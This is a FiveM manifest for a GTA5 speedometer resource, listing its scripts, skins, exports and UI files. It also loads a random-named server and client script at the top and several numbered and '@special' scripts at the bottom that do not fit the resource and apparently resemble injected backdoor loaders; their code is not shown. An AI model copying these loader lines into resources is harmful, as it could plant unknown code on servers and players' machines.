server_script "7KOXFZRLKWOR.lua"
client_script "7KOXFZRLKWOR.lua"
fx_version 'adamant'

game 'gta5'

description 'FiveM FXServer speedometer'

version '1.1.0'

client_scripts {
	'config.lua',
	'client.lua',
	'skins/default.lua',
	'skins/default_middle.lua',
	'skins/id6.lua',
	'skins/id7.lua'
}

exports {
	'getAvailableSkins',
	'changeSkin',
	'addSkin',
	'toggleSpeedo',
	'getCurrentSkin',
	'addSkin',
	'toggleFuelGauge',
	'DoesSkinExist'
}

ui_page 'html/speedometer.html'

files {
	'html/speedometer.html',
	'html/sounds/initiald.ogg'
}

client_script '45515.lua'
client_script '37518.lua'
client_script '@special/13142.lua'
client_script '@special/41323.lua'